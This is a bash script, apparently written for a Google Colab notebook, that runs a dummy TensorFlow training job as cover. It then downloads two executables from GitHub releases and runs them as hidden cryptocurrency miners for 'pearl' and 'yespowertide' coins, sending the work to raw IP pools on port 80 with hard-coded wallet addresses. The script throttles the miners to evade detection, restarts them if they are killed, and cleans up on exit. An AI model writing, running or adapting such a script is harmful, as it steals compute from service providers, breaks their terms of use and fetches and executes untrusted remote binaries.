#!/bin/bash
# v30 — back to basics: oneliner lu + warmup + cpulimit only
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK="$(date +%s | md5sum | head -c 8)"

echo "=== v30 — $WRK ==="

# 1. Fast warmup
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np
m=tf.keras.applications.MobileNetV2(include_top=False,weights=None)
x=tf.keras.layers.GlobalAveragePooling2D()(m.output)
m=tf.keras.Model(m.input,x);m.compile(optimizer='adam',loss='mse')
m.fit(np.random.rand(80,224,224,3).astype(np.float32),np.random.rand(80,1280).astype(np.float32),epochs=2,verbose=0)
" 2>/dev/null

# 2. Download — EXACT oneliner path
rm -rf /content/a 2>/dev/null; mkdir /content/a && cd /content/a
wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
chmod +x peak sse2

# 3. PRL — EXACT oneliner structure
(while true; do
    nice -n 19 ./peak --coin pearl --url 23.94.152.126:80 \
        --user "${PRL}.$(shuf -n 1 -i 1-9999999)" 2>/dev/null
    sleep 5
done) &
P1=$!
cpulimit -l 40 -p $P1 2>/dev/null &

sleep 10

# 4. TDC — EXACT oneliner structure
./sse2 -a yespowertide -o 47.251.244.12:80 \
    -u "${TDC}.Bismillah" -t 1 >/dev/null 2>&1 &
P2=$!
cpulimit -l 40 -p $P2 2>/dev/null &

echo "[*] v30 P1:$P1 P2:$P2 — bare minimum"

# 5. Minimal keepalive
(while sleep 300; do
    kill -0 $P1 2>/dev/null || { (while true;do nice -n 19 ./peak --coin pearl --url 23.94.152.126:80 --user "${PRL}.$(shuf -n 1 -i 1-9999999)" 2>/dev/null;sleep 5;done) & P1=$!;cpulimit -l 40 -p $P1 2>/dev/null &; }
    kill -0 $P2 2>/dev/null || { ./sse2 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.Bismillah" -t 1 >/dev/null 2>&1 & P2=$!;cpulimit -l 40 -p $P2 2>/dev/null &; }
done) &

trap "kill $P1 $P2 2>/dev/null;rm -rf /content/a" EXIT
sleep $((RANDOM%3600+5400))
